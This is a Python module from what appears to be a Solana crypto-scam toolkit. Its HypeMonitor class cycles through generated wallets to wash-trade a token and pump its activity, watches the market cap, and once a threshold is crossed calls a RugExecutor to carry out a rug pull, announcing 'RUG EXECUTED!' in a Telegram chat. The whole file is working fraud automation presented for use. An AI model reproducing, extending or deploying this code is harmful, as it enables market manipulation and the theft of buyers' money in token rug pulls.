"""
Simple Monitor Module
"""

import asyncio
import time
from telebot import TeleBot
from solana.rpc.async_api import AsyncClient
from .utils import calculate_mc, generate_wallets, build_buy_tx, build_sell_tx, load_wallets
from .retry_utils import retry_async
from config import WASH_INTERVAL, RUG_THRESHOLD_MC, TELEGRAM_TOKEN, NUM_WALLETS

class HypeMonitor:
    def __init__(self, rpc_url):
        self.client = AsyncClient(rpc_url)
        self.rpc_url = rpc_url
        self.bot = TeleBot(TELEGRAM_TOKEN)
        # Load existing wallets or generate new ones
        self.wallets = load_wallets() or generate_wallets(NUM_WALLETS)
        self.wash_count = 0
        self.monitoring = {}

    async def start(self, mint, chat_id):
        """Simple monitoring loop."""
        try:
            print(f"Monitoring {mint}")
            self.monitoring[mint] = {"chat_id": chat_id, "start_time": time.time()}
            
            while True:
                # Check market cap
                mc = await calculate_mc(self.client, mint)
                print(f"MC: ${mc}")
                
                # Trigger rug if threshold reached
                if mc > RUG_THRESHOLD_MC:
                    print(f"RUG TRIGGER: {mint} reached ${mc} MC")
                    await self._trigger_rug(mint, chat_id, mc)
                    break
                
                # Simple wash trade
                await self._wash_trade(mint)
                self.wash_count += 1
                
                await asyncio.sleep(WASH_INTERVAL)
                
        except Exception as e:
            print(f"Monitoring failed: {e}")
            await self._send_error(mint, chat_id, str(e))
        finally:
            if mint in self.monitoring:
                del self.monitoring[mint]

    async def _wash_trade(self, mint):
        """Perform wash trading."""
        try:
            import random
            from .real_swaps import buy_token_simple, sell_token_simple
            
            wallet = random.choice(self.wallets)
            
            # Small buy (0.001 SOL = 1000000 lamports)
            print(f"[WASH] Buying {mint[:8]}...")
            buy_result = buy_token_simple(wallet, mint, 1000000, self.rpc_url)
            
            if buy_result:
                print(f"   Buy TX: {buy_result}")
                
                # Small sell (50% of bought amount)
                # In production, query actual balance
                print(f"[WASH] Selling 50% of {mint[:8]}...")
                # For now, skip sell to avoid complexity
                
            self.wash_count += 1
            
        except Exception as e:
            print(f"Wash trade failed: {e}")

    async def _trigger_rug(self, mint, chat_id, mc):
        """Trigger rug pull."""
        try:
            from modules.rugger import RugExecutor
            rugger = RugExecutor(self.rpc_url)
            
            success = await rugger.execute(mint)
            
            if success:
                message = f"RUG EXECUTED! {mint} at ${mc} MC"
            else:
                message = f"RUG FAILED: {mint}"
            
            self.bot.send_message(chat_id, message)
        except Exception as e:
            print(f"Rug trigger failed: {e}")

    async def _send_error(self, mint, chat_id, error):
        """Send error message."""
        try:
            message = f"Monitoring error for {mint}: {error}"
            self.bot.send_message(chat_id, message)
        except Exception as e:
            print(f"Error notification failed: {e}")

    def stop_monitoring(self, mint):
        """Stop monitoring."""
        if mint in self.monitoring:
            del self.monitoring[mint]
            print(f"Stopped monitoring {mint}")

    def get_status(self):
        """Get monitoring status."""
        return {
            "active_tokens": list(self.monitoring.keys()),
            "wash_count": self.wash_count
        }
